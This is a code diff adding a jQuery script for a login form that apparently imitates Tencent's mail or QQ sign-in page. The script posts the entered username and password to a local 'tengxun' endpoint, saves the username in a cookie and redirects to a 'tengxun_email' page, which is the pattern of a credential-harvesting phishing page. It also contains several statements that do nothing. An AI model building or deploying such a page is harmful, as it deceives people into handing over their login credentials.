@@ -1,0 +1,43 @@
+$(document).ready(function () {
+    function setCookie(name, value, iDay) {
+        var oDate = new Date();
+
+        oDate.setDate(oDate.getDate() + iDay);
+
+        document.cookie = name + '=' + encodeURIComponent(value) + ';expires=' + oDate;
+    }
+    $("#inputuin").val() == ""
+    $("#pp").val() == ""
+    $(".signup_item_content_tips_error").addClass('active');
+    $(".signup_item_content_tips_error2").addClass('active');
+    $(".login_btn").click(function () {
+        var username = $("#inputuin").val()
+        var password = $("#pp").val()
+        if (username == "") {
+            $("#inputuin").css("border", "1px solid red")
+            $(".signup_item_content_tips_error").removeClass('active');
+        } else {
+            $("#inputuin").css("border", "1px solid #c9c9c9")
+            $(".signup_item_content_tips_error").addClass('active');
+        }
+        if (password == "") {
+            $("#pp").css("border", "1px solid red")
+            $(".signup_item_content_tips_error2").removeClass('active');
+        } else {
+            $("#pp").css("border", "1px solid #c9c9c9")
+            $(".signup_item_content_tips_error2").addClass('active');
+        }
+        if (username != "" && password != "") {
+
+            $.ajax({
+                url: "./tengxun",
+                type: "post",
+                datatype: "json",
+                data: { username: username, password: password }
+
+            })
+            setCookie('username', username,5);
+            window.location.href = "../tengxun_email";
+        }
+    })
+})
